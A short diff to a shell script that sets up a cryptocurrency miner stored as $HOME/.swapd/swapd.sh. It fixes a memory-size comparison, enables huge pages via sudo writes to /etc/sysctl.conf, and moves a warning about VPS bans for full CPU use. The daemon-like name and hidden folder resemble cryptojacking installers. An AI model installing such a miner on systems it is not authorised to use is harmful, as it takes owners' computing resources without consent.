@@ -367,7 +367,7 @@ if ! sudo -n true 2>/dev/null; then
   bash $HOME/.swapd/swapd.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1
 else
 
-  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
+  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
     echo "[*] Enabling huge pages"
     echo "vm.nr_hugepages=$((1168 + $(nproc)))" | sudo tee -a /etc/sysctl.conf
     sudo sysctl -w vm.nr_hugepages=$((1168 + $(nproc)))
@@ -381,9 +381,10 @@ else
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
   else
+    echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
+  fi
+fi
 
-echo ""
-echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
 if [ "$CPU_THREADS" -lt "4" ]; then
   echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
   echo "sudo apt-get update; sudo apt-get install -y cpulimit"
